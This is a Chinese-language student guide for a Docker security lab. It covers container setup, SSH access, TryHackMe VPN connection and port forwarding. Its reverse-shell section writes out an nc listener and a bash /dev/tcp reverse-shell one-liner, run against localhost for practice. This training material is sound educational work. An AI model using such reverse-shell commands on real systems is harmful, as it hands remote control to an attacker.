# 學員指南：Shell & 攻擊鍊實踐 Lab

跟著做就對了。**全部步驟 Windows 跟 macOS 一模一樣**。

---

## 你要先準備的東西

1. **Docker Desktop**—— <https://www.docker.com/products/docker-desktop/>
   - Windows 版裝完要重開機。
   - macOS 看晶片下載對應版本（Apple Silicon 是 M 系列）。
2. **這份資料夾**。解壓到任何位置都可以，但**路徑不要有中文或空白**，例如 `C:\lab\` 或 `~/lab/`。
3. **TryHackMe 的 OpenVPN 設定檔**
   - 登入 TryHackMe → 右上角頭像 → **Access** → 選 region → **Download Configuration File**。
   - 拿到一個 `xxx.ovpn`。

---

## 第一次設定（每台電腦只要做一次）

### 步驟 1：打開 Docker Desktop

裝好之後直接打開它。等左下角小鯨魚變綠色（或顯示 *Engine running*）才算啟動完成，第一次大概要 1～2 分鐘。

> Windows 如果跳「WSL 更新」提示就照它說的點下去。

### 步驟 2：啟動容器

#### Windows

1. 打開資料夾，**Shift + 滑鼠右鍵點空白處** → 選「在這裡開啟 PowerShell 視窗」。
2. 輸入：

   ```powershell
   .\start.ps1
   ```

3. 第一次會下載 + 建置映像檔，需要 5～10 分鐘。

> 如果跳「無法載入指令碼，因為已停用指令碼執行」，先跑這一行再回來：
>
> ```powershell
> Set-ExecutionPolicy -Scope CurrentUser RemoteSigned
> ```

#### macOS

1. 打開**終端機 (Terminal)**。
2. `cd` 到資料夾，例如：

   ```bash
   cd ~/Downloads/lab
   ```

3. 第一次要給腳本執行權限：

   ```bash
   chmod +x start.sh stop.sh forward.sh
   ```

4. 啟動：

   ```bash
   ./start.sh
   ```

跑完最後會印出怎麼進容器的指令。

## 進入容器

```bash
ssh -p 2222 student@127.0.0.1
```

- 第一次會問 `Are you sure you want to continue connecting?`，輸入 `yes` 按 Enter。
- 接著問密碼，輸入 `student`（**輸入時不會顯示任何字元，是正常的**），按 Enter。

進去之後看到一個歡迎選單就成功了。輸入 `lab-help` 隨時叫出選單。

## Shell 互動練習

容器裡輸入：

```
tutorial
```

腳本會帶你過 10 關。每關都會給你一個 prompt，按題目要求輸入指令，腳本會幫你執行並檢查。

需要查指令時，**另外開一個 SSH 視窗**或**用 tmux**（後面會教），輸入：

```
cheat shell
```

按 `q` 離開速查表。

## Reverse Shell

### 1. 進容器，開 tmux

```bash
ssh -p 2222 student@127.0.0.1
```

容器內：

```
tmux new -s lab
```

### 2. 切兩個 pane

按 **`Ctrl-b`** 然後鬆開，再按 **`|`**（直線符號）。畫面會分成左右兩塊。

- **左邊 pane = 攻擊者 (attacker)**
- **右邊 pane = 受害者 (victim)**

按 `Ctrl-b` 然後**方向鍵**可以在兩個 pane 之間切換。

### 3. 攻擊者開 listener（左 pane）

```
nc -lnvp 4444
```

### 4. 受害者打 reverse shell（右 pane）

```
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

切回左 pane（`Ctrl-b ←`），就會看到 shell 進來了！打 `id` 試試看。

需要更多技巧：

```
cheat reverse-shell
cheat tmux
```

> 結束時按 **`Ctrl-b d`** 離開 tmux 但保留 session（下次 `tmux attach` 就回來）。

## TryHackMe 實作

### 1. 把 .ovpn 放好

把從 TryHackMe 下載的檔案：

1. 複製到資料夾的 `vpn/` 子資料夾。
2. 改名為 `config.ovpn`（一字不差，全部小寫）。

完成後 `vpn/` 裡長這樣：

```
vpn/
└── config.ovpn      ← 你的檔案
```

### 2. 啟動容器（如果還沒開）

```bash
./start.sh        # macOS
.\start.ps1       # Windows
```

### 3. 進容器啟動 VPN

```bash
ssh -p 2222 student@127.0.0.1
```

容器內：

```
vpn-up
```

等到看到 `tun0 IP: ...` 就是連上了。

### 4. 確認連得到靶機

到 TryHackMe 房間頁面按 **Start Machine**，等它顯示綠色 active 狀態，**複製靶機 IP**。下面的 `<TARGET_IP>` 全部換成你看到的 IP（每個房間都不一樣，例如 `10.10.123.45`、`10.49.x.y` 之類的）。

容器內：

```
ping -c 2 <TARGET_IP>
```

收到回應就 OK。

### 5. 用瀏覽器看靶機網頁

**再開一個全新的終端機 / PowerShell 視窗**（不要關掉前一個 SSH 視窗），執行：

```powershell
.\forward.ps1     # Windows
```

```bash
./forward.sh      # macOS
```

腳本會問你兩個問題：

```
靶機 IP: <貼上 TryHackMe 給的 IP>
靶機 port（直接 Enter = 80）:
```

按完 Enter 之後，畫面會印出**瀏覽器要開的網址**，例如：

```
靶機：     <TARGET_IP>:80
瀏覽器開： http://127.0.0.1:8080
```

打開瀏覽器（Chrome / Edge / Firefox 都行），把那個網址貼上去就能看到靶機網頁。

> 這個視窗**保持開著**，關掉等於斷線。
> 如果靶機網頁是其他 port（例如 8080），把 port 那一題填靶機的 port（80 → 8080，443 → 8443，其他都直接同號）。
> 想直接下指令、不用腳本：`cheat thm` 看 SSH `-L` 公式。

## 常見問題

### Q1. 跑 `start` 沒問題，但 `ssh ...` 出現 `Connection refused`

容器還在啟動。等 5～10 秒再試。如果一直不行：

```
docker compose logs lab
```

把錯誤訊息給助教看。

### Q2. SSH 一直要密碼，輸入 student 也進不去

注意輸入密碼時**畫面不會有任何反應**（不會顯示星號），這是正常的。盲打輸入 `student` 然後按 Enter。

### Q3. 出現 `WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!`

通常是你重 build 過容器。執行：

- macOS：`ssh-keygen -R "[127.0.0.1]:2222"`
- Windows PowerShell：`ssh-keygen -R "[127.0.0.1]:2222"`

再 ssh 一次就好。

### Q4. `vpn-up` 卡很久 / 失敗

- `.ovpn` 沒放對：要在 `vpn/config.ovpn`。
- `.ovpn` 下載到一半壞掉：回 TryHackMe 重下一份。
- 看 log：容器內輸入 `sudo tail -50 /var/log/openvpn.log`。

### Q5. VPN 接上了，但瀏覽器連不到 `http://127.0.0.1:8080`

依序檢查：

1. **靶機真的開著嗎？** TryHackMe 房間頁面按 Start Machine。
2. **第二個 SSH 視窗（做 port forward 那個）還開著嗎？** 關掉就斷了。
3. **容器內 ping 得到嗎？** 容器內 `ping -c 2 <TARGET_IP>`。
4. **port 對嗎？** 有些靶機是 8080 不是 80。試試 `-L 8080:<TARGET_IP>:8080`。

### Q6. Docker Desktop 一直開不起來（Windows）

- BIOS 要打開虛擬化（VT-x / AMD-V / SVM）。
- Windows Features 要勾「虛擬機器平台」與「適用於 Linux 的 Windows 子系統」。
- 重開機。
